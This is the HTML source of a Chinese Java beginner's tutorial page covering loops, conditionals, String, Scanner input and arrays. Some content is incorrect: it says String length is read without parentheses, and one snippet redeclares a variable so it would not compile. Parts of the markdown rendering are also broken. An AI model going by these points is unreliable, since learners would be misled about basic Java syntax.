punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  continue 让程序立刻跳转到<strong>下一次循环</strong>的迭代，而<strong>不是跳出整个循环</strong></p></li><li><p>  在for循环中，continue使程序立即跳转到更新语句</p></li><li><p>while和do while中，程序立即跳转到bool表达式的判断语句</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><ol><li>  if else</li><li>  switch case</li><li>  if ,else if, else</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token string">"yes"</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token string">"false"</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>  注意default的先后顺序：先全部判断一遍case语句，在没有case语句的值和变量值相等时执行，default分支不需要break</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> grade <span class="token operator">=</span> <span class="token string">'C'</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>grade<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token string">'A'</span> <span class="token operator">:</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'B'</span> <span class="token operator">:</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'C'</span> <span class="token operator">:</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span> <span class="token operator">:</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"未知等级"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="return"><a href="#return" class="headerlink" title="return"></a>return</h2><ol><li><p>return 语句如果用在main函数中，则会跳出程序</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Return</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> a<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            x <span class="token operator">+=</span> a<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><ol><li><p>  在Java中<strong>字符串属于对象</strong>，Java提供了String类来创建和操作字符串。</p></li><li><p>创建字符串</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"Runoob"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>也可以和其它对象一样，使用关键字和构造方法来创建String对象</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>String创建的字符串存储在公共池中，而new创建的字符串对象在堆上</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220810173609.png"></p></li><li><p>  注意：String类是不可改变的，所以一旦创建了String对象，那么它的值就无法改变了。</p></li><li><p>  如果需要对字符串做很多修改，那么应该选择使用 <a href="https://www.runoob.com/java/java-stringbuffer.html">StringBuffer &amp; StringBuilder 类</a>。</p></li></ol><h4 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h4><ol><li><p>  使用length方法，获取有关对象的信息的方法被称为访问器方法</p></li><li><p>语法：</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> len <span class="token operator">=</span> str_name<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>  注意：对象.length，后面不加括号</li></ol><h4 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h4><ol><li><p>使用concat连接字符串</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">string1<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string">"我的名字是"</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">"syk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用 <strong>+</strong> 操作符来连接字符串</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token string">"Hello"</span> <span class="token operator">+</span> <span class="token string">"syk"</span> <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li></ol><h2 id="键盘输入语句"><a href="#键盘输入语句" class="headerlink" title="键盘输入语句"></a>键盘输入语句</h2><ol><li><p>  在input.java中，需要一个扫描器（对象），Scanner，来接收用户输入的数据，使用键盘输入语句来获取</p></li><li><p>步骤</p>  <pre class="line-numbers language-text" data-language="text"><code class="language-text">1. 导入该类的所在包，java.util.*  要引用一个类，就必须导入一个包2. 创建该类的对象（声明变量）3. 调用里面的功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220811161745.png"></p></li><li><p>```java<br>  import java.util.Scanner;</p><p>  public class Input {</p><pre><code>  public static void main(String[] args) &#123;      Scanner scanner = new Scanner(System.in); // new创建一个对象，最前面的是表明是Scanner类的名字为scanner的变量      System.out.println(&quot;请输入名字&quot;);      String name = scanner.next(); // next()是查找并返回来自此扫描器的下一个完整标记      System.out.println(&quot;请输入年龄&quot;);      int age = scanner.nextInt();      System.out.println(&quot;名字为&quot; + name + &quot;年龄为&quot; + age);  &#125;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">5.   scanner是一个简单的文本扫描器6.   &#96;&#96;&#96;java     import java.util.Scanner;     Scanner scanner &#x3D; new Scanner(System.in);     datatype name &#x3D; scanner.next(); &#x2F;&#x2F; scanner.next(); 默认是string     datatype name &#x3D; scanner.nextInt(); &#x2F;&#x2F; scanner.nextInt(); 只有表明是Int才会接收int     datatype name &#x3D; scanner.nextDouble(); &#x2F;&#x2F; 只有表明是Double,才会接收double类型的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="声明数组变量"><a href="#声明数组变量" class="headerlink" title="声明数组变量"></a>声明数组变量</h3><ol><li><p>首先必须声明数组变量，才能在程序中使用数组。</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">datatype<span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">;</span>datatype array<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  建议使用datatype[] array_name的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C/C++ 语言 ，在Java中采用是为了让 C/C++ 程序员能够快速理解java语言。</p></li></ol><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><ol><li><p>Java使用new操作符来创建数组</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">array_name <span class="token operator">=</span> <span class="token keyword">new</span> datatype<span class="token punctuation">[</span>arraysize<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  上面语法做了两件事，第一：使用datatype[size]创建了一个数组，第二：把新创建的数组引用复制给变量array——name</p></li></ol><h3 id="声明和创建数组一步完成"><a href="#声明和创建数组一步完成" class="headerlink" title="声明和创建数组一步完成"></a>声明和创建数组一步完成</h3><pre class="line-numbers language-none"><code class="language-none">datatype[] array_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="数组的引用"><a href="#数组的引用" class="headerlink" title="数组的引用"></a>数组的引用</h3><ol><li>  引用，使用，访问，获取 是一个意思</li></ol><h3 id="数组的动态初始化1"><a href="#数组的动态初始化1" class="headerlink" title="数组的动态初始化1"></a>数组的动态初始化1</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">datatype<span class="token punctuation">[</span><span class="token punctuation">]</span> name <span class="token operator">=</span> <span class="token keyword">new</span> datatype<span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="数组的动态初始化2"><a href="#数组的动态初始化2" class="headerlink" title="数组的动态初始化2"></a>数组的动态初始化2</h3><ol><li>  有些时候可以在for循环的外面声明一个数组，但是分配内存是当某个条件满足的时候才去真正分配</li><li>  第一步，先声明数组（声明时还没有分配空间，声明数组的名字的指针还没有指向任何空间）</li><li>  此时该数组时null</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li><p>  第二步，创建数组</p></li><li><p>只有new之后，才会分配内存空间，可以存放数据</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">数组名 <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>大小<span class="token punctuation">]</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="数组的静态初始化"><a href="#数组的静态初始化" class="headerlink" title="数组的静态初始化"></a>数组的静态初始化</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>上面的用法等同于</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  当知道数组有多少元素，具体值时才用静态方法初始化数组</p></li></ol><h3 id="数组detail"><a href="#数组detail" class="headerlink" title="数组detail"></a>数组detail</h3><ol><li><p>数组中的元素是相同类型的，如果在低精度数组中写了一个高精度数组，则会报错；如果在一个高精度数组中写了一个低精度数组，没有问题，自动转换</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">detail<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span> 错误<span class="token operator">:</span> 不兼容的类型<span class="token operator">:</span> 从<span class="token keyword">double</span>转换到<span class="token keyword">int</span>可能会有损失        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3.3</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                            <span class="token operator">^</span><span class="token number">1</span> 个错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>数组下标必须在指定范围内使用，否则报：下标越界异常，比如 int[] arr = new int[5];则有效下标是0-4，<strong>即数组的下标，最小是0，最大是数组长度-1</strong>，否则<strong>数组越界</strong>，在编译的时候不会报错，当运行的时候才会报错</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ArrayIndexOutOfBoundsException</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  数组属于引用类型，数组行数据是对象</p></li></ol><h3 id="数组的赋值机制"><a href="#数组的赋值机制" class="headerlink" title="数组的赋值机制"></a>数组的赋值机制</h3><h4 id="基本数据类型的赋值，拷贝赋值"><a href="#基本数据类型的赋值，拷贝赋值" class="headerlink" title="基本数据类型的赋值，拷贝赋值"></a>基本数据类型的赋值，拷贝赋值</h4><ol><li><p>  基本数据类型的赋值，赋值方式为拷贝</p></li><li><p>n2的变化不会影响到n1</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n1 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> n2 <span class="token operator">=</span> n1<span class="token punctuation">;</span><span class="token keyword">int</span> n2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//此时n1还是10，n2变为了1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="数组赋值，引用赋值"><a href="#数组赋值，引用赋值" class="headerlink" title="数组赋值，引用赋值"></a>数组赋值，引用赋值</h4><ol><li><p>  数组在默认情况下是引用传递，赋的值是地址，赋值方式为引用赋值</p></li><li><p>引用赋值传递的是一个地址，arr2和arr1指向的是同一个地址，所以当对arr2的数组进行操作时，会对arr1产生影响</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> detail <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2 <span class="token operator">=</span> arr1<span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> arr1<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这个时候就会输出10,2,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="拷贝赋值和引用赋值的区别"><a href="#拷贝赋值和引用赋值的区别" class="headerlink" title="拷贝赋值和引用赋值的区别"></a>拷贝赋值和引用赋值的区别</h3><ol><li><p>  jvm的内存分为：栈、堆、方法区</p></li><li><p>基本数据类型直接放在栈中，即值拷贝/传递在栈中进行</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220811180118.png"></p></li><li><p>  数组在定义的时候，赋的值并不是具体的值，而是一个地址，这个地址指向的时是堆中的一片空间</p></li><li><p>  <strong>在内存中，只要分配了一个数据空间，一定会对应一个地址</strong></p></li><li><p>引用传递也叫<strong>地址拷贝</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220811181246.png"></p></li></ol><h3 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h3><ol><li><p>  将int[] arr1 = {1,2,3} 拷贝到 arr2数组，<strong>要求数据空间是独立的</strong></p></li><li><p>```java<br>  int[] arr1 = {1,2,3};<br>  int[] arr2 = new int[arr1.length];<br>  // 遍历arr1,把每个元素拷贝到对应元素的位置<br>  for(int i = 0;i &lt; arr1.length;i++){</p><pre><code>  arr2[i] = arr1[i];</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">### 处理数组1.   数组的元素类型和数组的大小都是确定的，所以当处理数组元素时候，我们通常使用基本循环或者 For-Each 循环。、#### For-each循环1.   For-each循环，加强型循环，可以在不使用下标的情况下遍历数组     &#96;&#96;&#96;java     for(type element : array)&#123;     System.out.println(element);     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Testarray</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> myList <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">1.9</span><span class="token punctuation">,</span> <span class="token number">2.9</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">:</span> myList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="数组作为函数的参数"><a href="#数组作为函数的参数" class="headerlink" title="数组作为函数的参数"></a>数组作为函数的参数</h4><ol><li><p>数组可以作为参数传递给方法</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Print</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token number">3.3</span><span class="token punctuation">,</span><span class="token number">44.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printArray</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token 